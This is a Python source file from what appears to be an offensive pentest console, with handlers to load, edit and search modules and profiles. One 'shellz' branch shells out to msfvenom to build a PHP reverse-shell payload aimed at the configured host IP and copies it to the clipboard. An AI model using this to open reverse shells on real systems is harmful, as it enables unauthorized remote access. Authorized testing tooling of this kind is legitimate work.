import sys,os,re,json
import clipboard, importlib

from src.miscellaneous.config import Config,bcolors
from src.menus.module import switcher_module
from src.profile.profiler import Profiler
from src.menus.commons import State

shellz_notes = ["Spawn TTY shell https://netsec.ws/?p=337"]

def external_shellz(cmd=None,state=None):
	out = ""
	if cmd[0] == "linux_x86":
		clipboard.copy(out)
		print("{}* linux_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
		return
	elif cmd[0] == "windows_x86":
		clipboard.copy(out)
		print("{}* windows_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
		return
	elif cmd[0] == "php":
		out = os.popen("msfvenom -p php/reverse_php LHOST="+Config.CONFIG['GENERAL']['HOSTIP']+" LPORT="+Config.CONFIG['SHELLZ']['SHELLPORT']+" -f raw").read()
	elif cmd[0] == "asp":
		return
	elif cmd[0] == "jsp":
		return
	elif cmd[0] == "exe":
		return
	elif cmd[0] == "notes":
		for note in shellz_notes:
			print("{}[*] {}{}".format(bcolors.OKBLUE,note,bcolors.ENDC))
		return
	else:
		print("{}Invalid option!{}".format(bcolors.WARNING,bcolors.ENDC))
		return
	clipboard.copy(out)
	print("{}* Shell {} copied to clipboard{}".format(bcolors.WARNING,cmd[0],bcolors.ENDC))
	return


def external_edit(cmd=None,state=None):
	if len(cmd)==2:
		if bool(re.match(r"^profile\/.+",cmd[1])):
			if os.path.isfile(Config.CONFIG['GENERAL']['PATH'] + "/src/" + cmd[1] + ".tpl"):
				os.system(Config.CONFIG['GENERAL']['EDITOR']+" "+Config.CONFIG['GENERAL']['PATH']+"/src/"+cmd[1]+".tpl")
			else:
				print("{}Profile not found!{}".format(bcolors.WARNING,bcolors.ENDC))
		else:
			print("{}Invalid Profile!{}".format(bcolors.WARNING,bcolors.ENDC))

	else:
		print("{}Usage: edit <Profile>{}".format(bcolors.WARNING,bcolors.ENDC))

def external_use(cmd=None,state=None):
	if len(cmd)==2:
		if bool(re.match(r"^module\/.+",cmd[1])):
			
			if os.path.isfile(Config.CONFIG['GENERAL']['PATH'] + "/src/" + cmd[1] + ".py") and cmd[1] in switcher_module:
				State.module_state = cmd[1]
				State.module_class = getattr(importlib.import_module(("src/"+cmd[1]).replace("/",".")),switcher_module.get(State.module_state,None))
				del State.actual_option[:]
				State.actual_option = list(State.module_option.keys())+State.global_option+State.config_option
				#Check if class was found!
			else:
				print("{}Module not found!{}".format(bcolors.WARNING,bcolors.ENDC))
		elif bool(re.match(r"^profile\/.+",cmd[1])):
			if os.path.isfile(Config.CONFIG['GENERAL']['PATH'] + "/src/" + cmd[1] + ".tpl"):
				try:
					tpl = json.load(open(Config.CONFIG['GENERAL']['PATH']+"/src/"+cmd[1]+".tpl"))
				except Exception as e:
					print("{}File does not contain valid JSON!{}".format(bcolors.WARNING,bcolors.ENDC))
				else:
					try:
						if Profiler.validate(tpl):
							Profiler(tpl).start()
						else:
							print("{}File .tpl not in expected format!{}".format(bcolors.WARNING,bcolors.ENDC))
					except Exception as e:
						print("{}".format(e))
						print("{}".format(traceback.print_exc()))
			else:
				print("{}Profile not found!{}".format(bcolors.WARNING,bcolors.ENDC))
		else:
			print("{}Invalid Module/Profile!{}".format(bcolors.WARNING,bcolors.ENDC))


	else:
		print("{}Usage: use <Module||Profile>{}".format(bcolors.WARNING,bcolors.ENDC))


def external_search_aux(opt,state=None):

	print("{}{}Modules:{}".format(bcolors.BOLD,bcolors.WARNING,bcolors.ENDC))
	for r, d, f in os.walk(Config.CONFIG['GENERAL']['PATH'] + "/src/module"):
		ext = "\.py"
		ext_cut = -3
		for file in f:
			if bool(re.match(r"^[^_][a-zA-Z0-9_]+"+ext+"$",file)) and (file[:ext_cut] not in ["monitor","module","profiler","portscanner"]):
				path = r.split("src")[1][1:]
				split_path = path.split("/")
				split_path.append(file[:ext_cut])
				if opt != None and opt in split_path:
					print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))
				elif opt == None:
					print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))
	
	print("{}{}Profiles:{}".format(bcolors.BOLD,bcolors.WARNING,bcolors.ENDC))
	for r, d, f in os.walk(Config.CONFIG['GENERAL']['PATH'] + "/src/profile"):
		ext = "\.tpl"
		ext_cut = -4
		for file in f:
			if bool(re.match(r"^[^_][a-zA-Z0-9_]+"+ext+"$",file)) and (file[:ext_cut] not in ["monitor","module","profiler","portscanner"]):
				path = r.split("src")[1][1:]
				split_path = path.split("/")
				split_path.append(file[:ext_cut])
				if opt != None and opt in split_path:
					print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))
				elif opt == None:
					print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))

def external_search(cmd=None,state=None):
	if len(cmd) == 1:
		external_search_aux(None)
	elif len(cmd) == 2:
		external_search_aux(cmd[1])
	else:
		print("{}Usage: list <module||profile||empty>{}".format(bcolors.WARNING,bcolors.ENDC))
	return
